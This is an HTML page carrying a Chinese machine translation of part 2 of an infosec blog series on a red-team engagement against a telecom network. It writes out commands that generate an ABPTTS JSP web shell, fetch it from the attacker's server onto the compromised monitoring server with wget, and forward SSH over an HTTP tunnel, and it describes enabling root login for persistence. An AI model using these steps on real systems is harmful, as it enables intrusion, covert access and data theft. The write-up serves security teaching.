<html>
<head>
<title>How I hacked into a Telecom Network — Part 2 (Playing with Tunnels: TCP Tunneling)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何侵入电信网络—第2部分(玩隧道:TCP隧道)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-hacked-into-a-telecom-network-part-2-playing-with-tunnels-tcp-tunneling-b4cef2837938?source=collection_archive---------2-----------------------#2020-07-11">https://infosecwriteups.com/how-i-hacked-into-a-telecom-network-part-2-playing-with-tunnels-tcp-tunneling-b4cef2837938?source=collection_archive---------2-----------------------#2020-07-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><blockquote class="jn jo jp"><p id="8d6d" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><em class="iq">TLDR；一家电信公司的红队项目。立足于公司的网络监控系统(NMS)。通过HTTP隧道传输SSH的反向外壳问题已排序。当通过HTTP获得SSH时变成了完全忍者。在网络内部代理以获取内部网络扫描。使用SS7应用程序访问CDRs和VLR。</em></p></blockquote></div><div class="ab cl kp kq hu kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="ij ik il im in"><h2 id="9530" class="kw kx iq bd ky kz la dn lb lc ld dp le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak">回顾:</strong>一家电信公司的红队项目。找到了感兴趣的子域，在那个子域上做了全端口扫描，找到了端口12000/tcp，14000/tcp，14100/tcp找到了JBoss的一个运行实例(我真幸运！)，为RCE开发了JBoss，现在遇到了反向外壳的问题。</h2></div><div class="ab cl kp kq hu kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="ij ik il im in"><p id="a69b" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">有关详细信息，您可以查看以下链接:<br/> <a class="ae ls" href="https://medium.com/bugbountywriteup/how-i-hacked-into-a-telecom-network-part-1-getting-the-rce-167c2bb320e6" rel="noopener"> <strong class="jt ir"> <em class="js">第一部分—获取RCE</em></strong></a><strong class="jt ir"><em class="js"><br/></em></strong><a class="ae ls" href="https://medium.com/bugbountywriteup/how-i-hacked-into-a-telecom-network-part-3-playing-with-tunnels-stealthy-ssh-dynamic-tunnels-5ac26557d0eb" rel="noopener"><strong class="jt ir"><em class="js">第三部分—玩隧道:隐形SSH &amp;动态SSH隧道</em></strong></a><strong class="jt ir"><em class="js"><br/></em></strong><a class="ae ls" href="https://medium.com/@TheCyb3rAlpha/how-i-hacked-into-a-telecom-network-part-4-getting-access-to-cdrs-ss7-applications-vlrs-9a8cf95e2648" rel="noopener"><strong class="jt ir"><em class="js">第四部分—获取CDRs、SS7应用&amp;</em></strong></a></p></div><div class="ab cl kp kq hu kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="ij ik il im in"><p id="ed63" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">现在，当我试图获得一个稳定的反向外壳时，我失败了。我想到的另一个想法是获得一个bind shell(为了稳定起见，在HTTP上获得SSH)，而不是在HTTP上获得reverse(HTTP上的TCP隧道)。但是我到底在这里得到了什么？</p><blockquote class="jn jo jp"><p id="56a8" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir">HTTP上的TCP隧道(出于TCP稳定性目的+秘密的SSH连接(通过创建的TCP隧道)+ SOCKS隧道(动态SSH隧道)，用于使用Metasploit进行内部网络扫描=利用内部网络服务通过这些递归隧道来导出数据。</strong></p></blockquote><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi lt"><img src="../Images/836c58f451e9b9120895aa865e010d35.png" data-original-src="https://miro.medium.com/v2/resize:fit:600/0*v-u_xH8fxANBX_x7"/></div></figure><p id="c33e" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">看起来很复杂？让我们把它分成几个步骤:</p><ol class=""><li id="01aa" class="mb mc iq jt b ju jv jy jz lf md lj me ln mf ko mg mh mi mj bi translated"><em class="js">首先，我在我的服务器和NMS服务器之间创建了一个桥，这样它应该支持不同协议的通信，而不仅仅是HTTP/HTTPS(目前是&gt;L2)[</em><strong class="jt ir"><em class="js">HTTP上的TCP隧道</em> </strong> <em class="js"> ] </em></li><li id="6471" class="mb mc iq jt b ju mk jy ml lf mm lj mn ln mo ko mg mh mi mj bi translated"><em class="js">一旦创建了桥(</em><strong class="jt ir"><em class="js">TCP Tunnel over HTTP</em></strong><em class="js">)，我就配置并实现了从我的服务器(</em><strong class="jt ir"><em class="js">2222/TCP</em></strong><em class="js">)到NMS服务器(</em><strong class="jt ir"><em class="js">22/TCP</em></strong><em class="js">)的SSH端口转发，这样我就可以通过SSH over HTTP连接到NMS服务器。(准确的说是SSH over TCP over HTTP)</em><strong class="jt ir"><em class="js">注:NMS服务器上的SSH服务运行于127.0.0.1 </em> </strong></li><li id="2252" class="mb mc iq jt b ju mk jy ml lf mm lj mn ln mo ko mg mh mi mj bi translated"><em class="js">然后，我将NMS SSH服务器配置为</em> <strong class="jt ir"> <em class="js">允许root登录</em> </strong> <em class="js">和</em> <strong class="jt ir"> <em class="js">生成SSH私钥</em> </strong> <em class="js">(将我的公钥复制到authorized_hosts文件)以便通过SSH访问NMS服务器。</em></li><li id="ee2b" class="mb mc iq jt b ju mk jy ml lf mm lj mn ln mo ko mg mh mi mj bi translated"><em class="js">我使用私钥检查了到NMS的SSH连接，当它工作时，我创建了一个</em> <strong class="jt ir"> <em class="js">动态SSH隧道</em> </strong> <em class="js"> (SOCKS)来代理SSH隧道上的Metasploit(准确地说是HTTP上的TCP隧道上的SSH隧道上的Metasploit)。</em></li></ol><p id="1046" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">我想一步一步地在博客上讲述我是如何创造隧道的，以及我玩隧道的方式。</p></div><div class="ab cl kp kq hu kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="ij ik il im in"><h1 id="d90a" class="mp kx iq bd ky mq mr ms lb mt mu mv le mw mx my li mz na nb lm nc nd ne lq nf bi translated">隧道101</h1><blockquote class="jn jo jp"><p id="6b25" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">一个<strong class="jt ir">隧道协议</strong>是一个<a class="ae ls" href="https://en.wikipedia.org/wiki/Communications_protocol" rel="noopener ugc nofollow" target="_blank">通信协议</a>，允许数据从一个网络移动到另一个网络。它包括允许<a class="ae ls" href="https://en.wikipedia.org/wiki/Private_network" rel="noopener ugc nofollow" target="_blank">私有网络</a>通信通过一个叫做<a class="ae ls" href="https://en.wikipedia.org/wiki/Encapsulation_(networking)" rel="noopener ugc nofollow" target="_blank">封装</a>的过程在公共网络(如<a class="ae ls" href="https://en.wikipedia.org/wiki/Internet" rel="noopener ugc nofollow" target="_blank">互联网</a>)上发送。因为隧道涉及<a class="ae ls" href="https://en.wikipedia.org/wiki/Encapsulation_(networking)" rel="noopener ugc nofollow" target="_blank">将流量数据</a>重新打包成不同的形式，也许以<a class="ae ls" href="https://en.wikipedia.org/wiki/Encryption" rel="noopener ugc nofollow" target="_blank">加密</a>为标准，它可以<strong class="jt ir">隐藏通过隧道的流量</strong>的性质。</p><p id="bdd6" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">隧道协议通过使用<a class="ae ls" href="https://en.wikipedia.org/wiki/Network_packet" rel="noopener ugc nofollow" target="_blank">数据包</a>(<a class="ae ls" href="https://en.wikipedia.org/wiki/Payload_(computing)" rel="noopener ugc nofollow" target="_blank">有效载荷</a>)的数据部分来承载实际提供服务的数据包。隧道使用分层协议模型，例如那些<a class="ae ls" href="https://en.wikipedia.org/wiki/Open_Systems_Interconnection" rel="noopener ugc nofollow" target="_blank"> OSI </a>或<a class="ae ls" href="https://en.wikipedia.org/wiki/TCP/IP" rel="noopener ugc nofollow" target="_blank"> TCP/IP </a>协议组，但是当使用有效载荷来承载网络通常不提供的服务时，通常会违反分层。通常，在分层模型中，传送协议在与有效载荷协议相同或更高的级别上运行。</p><p id="2ff6" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir">来源:</strong> <a class="ae ls" href="https://en.wikipedia.org/wiki/Tunneling_protocol" rel="noopener ugc nofollow" target="_blank"> <strong class="jt ir">维基百科</strong> </a></p></blockquote><p id="8c0f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">因此，基本的想法是使用web服务器作为中间代理，将所有网络数据包(TCP数据包)从web服务器转发到内部网络。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ng"><img src="../Images/6f83caf85849f46a85f6e77da063e136.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5SvfZEbQKL6pWcgN83UdEQ.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">使用HTTP协议通过web服务器将TCP数据包转发到内部网络</figcaption></figure><p id="370c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">在限制端口访问和过滤<a class="ae ls" href="https://en.wikipedia.org/wiki/Egress_filtering" rel="noopener ugc nofollow" target="_blank">出口流量</a>的情况下，TCP隧道可以帮助您。在我的例子中，没有太多的过滤，但是，我使用这种技术来获得稳定的外壳访问。</p><p id="34e6" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">现在，我已经在服务器上拥有了一个RCE，并且拥有“root”权限。我很快利用这个机会使用<a class="ae ls" href="https://github.com/nccgroup/ABPTTS" rel="noopener ugc nofollow" target="_blank"> <strong class="jt ir"> ABPTTS </strong> </a>创建了一个基于JSP的shell</p></div><div class="ab cl kp kq hu kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="ij ik il im in"><h1 id="befa" class="mp kx iq bd ky mq mr ms lb mt mu mv le mw mx my li mz na nb lm nc nd ne lq nf bi translated">通向太阳的黑色道路(ABPTTS)</h1><p id="172a" class="pw-post-body-paragraph jq jr iq jt b ju np jw jx jy nq ka kb lf nr ke kf lj ns ki kj ln nt km kn ko ij bi translated">正如GitHub repo中所解释的，</p><blockquote class="jn jo jp"><p id="c97c" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">ABPTTS使用Python客户端脚本和web应用服务器页面/包，通过HTTP/HTTPS连接将TCP流量隧道传输到web应用服务器。</p></blockquote><p id="3254" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">目前，该工具仅支持JSP/WAR和ASP.NET服务器端组件。</p><p id="9dbb" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">因此，我们的想法是使用ABPTTS创建一个基于JSP的shell，并将其上传到web服务器，让该工具与JSP shell连接，并通过HTTP创建一个TCP隧道，从而在我的系统和服务器之间创建一个安全的shell (SSH)。</p><p id="0c96" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated"><strong class="jt ir">【jexws4.jsp】python abpttsfactory . py-o</strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nu"><img src="../Images/09ef1e8d2845aafb660a9a1d67c1a55e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_hbfoVgAUH0J7ofsUb-WcA.png"/></div></div></figure><p id="a719" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">当使用ABPTTS生成shell时，该工具创建了一个配置文件，用于创建HTTP/HTTPS上的TCP隧道。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nv"><img src="../Images/b51e2493d62776c337091112848a4dca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UNDD4wUTmYg6cIwHXwEGWA.png"/></div></div></figure><p id="8b89" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">然后，我使用wget将JSP shell上传到服务器。<strong class="jt ir">注意:jexws4.war shell是Jexboss的一个包。当您通过Jexboss利用JBoss漏洞时，该工具会将自己的WAR shell上传到服务器。在我的例子中，我只是试图找到这个WAR/JSP shell(jexws4.jsp)并用ABPTTS shell </strong>替换它</p><p id="6be2" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated"><strong class="jt ir"><em class="js">wget</em></strong><a class="ae ls" rel="noopener ugc nofollow" target="_blank" href="/[MY"><strong class="jt ir"><em class="js">http://【我的</em> </strong> </a> <strong class="jt ir"> <em class="js">服务器]/jexws 4 . JSP-O&lt;jexws4.jsp shell在NMS服务器上的位置&gt; </em> </strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nw"><img src="../Images/e79eefc13492878411de38bb49c276e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cfrt_1GOGmc8wyH09isVhw.png"/></div></div></figure><p id="dd78" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">ABPTTS shell上传到服务器后，我在Jexboss上通过执行一个随机命令来查看输出，很快就确认了这一点。为什么？现在Jexboss shell被ABPTTS shell覆盖了，无论我执行什么命令，输出总是ABPTTS shell打印出来的散列。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nx"><img src="../Images/4807275df97ec562c8b568c19b9c425f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dkCJTTFqqh6VenMAWWjLzw.png"/></div></div></figure><p id="4b76" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">从上面的截图中可以看到，当我执行“id”命令时，我得到了一个奇怪的散列，证明ABPTTS shell上传成功！</p><p id="7422" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">现在我已经配置了一个HTTP 上的<strong class="jt ir"> TCP隧道，接下来我想做的事情是隧道化运行在服务器上的SSH端口(NMS </strong>上的<strong class="jt ir"> 22/tcp)并将端口绑定到我的系统(<strong class="jt ir"> 2222/tcp </strong>)。为什么？这样我就可以通过SSH连接到NMS。你注意到我在这里做什么了吗？</strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ny"><img src="../Images/4fc99d25be9e54d2aa5b1fd2959f40e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fjNFfSNw7QPSc_Z4MgkCtQ.jpeg"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">通过HTTP上的TCP隧道进行SSH端口转发(尚未隧道化)</figcaption></figure><p id="984f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">尽管我还没有在NMS和我自己的服务器上为SSH隧道配置SSH部分。现在，我只准备了端口转发机制，这样我就可以使用端口2222/tcp从我的服务器到达NMS上的本地端口22/tcp</p><p id="d4d8" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated"><strong class="jt ir"><em class="js">python ABPTTS client . py-c&lt;配置文件的位置&gt;-u&lt;ABPTTS shell URL&gt;-f 127 . 0 . 0 . 1:2222/127 . 0 . 0 . 1:22</em></strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nu"><img src="../Images/0aac87b693262ff460d13d261137b362.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KR7ZbW6daSN92tLce6SRxw.png"/></div></div></figure><p id="a410" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">我检查了我的连接表，以检查端口是否被正确转发。正如你在下面的截图中看到的，我的服务器的端口2222/tcp处于监听状态。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nz"><img src="../Images/f42b4a878a245aaa983f00d99ee5dd83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jGWmg3to1YkhQEPn1efTsw.png"/></div></div></figure><p id="7965" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated">现在要做的下一件事是配置SSH服务器以连接到NMS并启动一个动态SSH隧道(SOCKS)。我将在下一篇文章<strong class="jt ir"> <em class="js"> : </em> </strong>中讨论这个问题</p><p id="8cab" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lf kd ke kf lj kh ki kj ln kl km kn ko ij bi translated"><a class="ae ls" href="https://medium.com/bugbountywriteup/how-i-hacked-into-a-telecom-network-part-3-playing-with-tunnels-stealthy-ssh-dynamic-tunnels-5ac26557d0eb" rel="noopener"> <strong class="jt ir"> <em class="js">第三部——玩隧道:隐身宋承宪&amp;动态隧道</em> </strong> </a></p><h1 id="de7a" class="mp kx iq bd ky mq oa ms lb mt ob mv le mw oc my li mz od nb lm nc oe ne lq nf bi translated">推广时间！</h1><p id="8d08" class="pw-post-body-paragraph jq jr iq jt b ju np jw jx jy nq ka kb lf nr ke kf lj ns ki kj ln nt km kn ko ij bi translated">如果你们想了解更多关于我使用的技术及其背后的基本概念，可以阅读我的书(与<strong class="jt ir"><em class="js">@ himan Shu _ hax</em></strong><em class="js">)</em></p><blockquote class="jn jo jp"><p id="a7f0" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir"> <em class="iq">动手红队战术</em></strong>——<a class="ae ls" href="https://www.amazon.in/Hands-Penetration-Testing-Metasploit-vulnerabilities-ebook/dp/B07MT8DDBR" rel="noopener ugc nofollow" target="_blank">亚马逊</a>，<a class="ae ls" href="https://www.packtpub.com/in/networking-and-servers/hands-red-team-tactics" rel="noopener ugc nofollow" target="_blank"> PacktPub </a></p></blockquote><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi of"><img src="../Images/49183e9f12fed4d46b3e035adceddb8e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*I-o-JTOEm8llRpfA.jpg"/></div></div></figure><blockquote class="jn jo jp"><p id="626a" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir"> <em class="iq">使用Metasploit</em></strong>—<a class="ae ls" href="https://www.amazon.in/Hands-Penetration-Testing-Metasploit-vulnerabilities-ebook/dp/B07MT8DDBR" rel="noopener ugc nofollow" target="_blank">Amazon</a>，<a class="ae ls" href="https://www.packtpub.com/in/networking-and-servers/hands-web-penetration-testing-metasploit" rel="noopener ugc nofollow" target="_blank"> PacktPub </a>进行实际操作的Web应用渗透测试</p></blockquote><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi of"><img src="../Images/0bad1ace10ecc835b82b0fbb2be73fae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fJ_MJL4kLbCSD9Vb.jpg"/></div></div></figure></div></div>    
</body>
</html>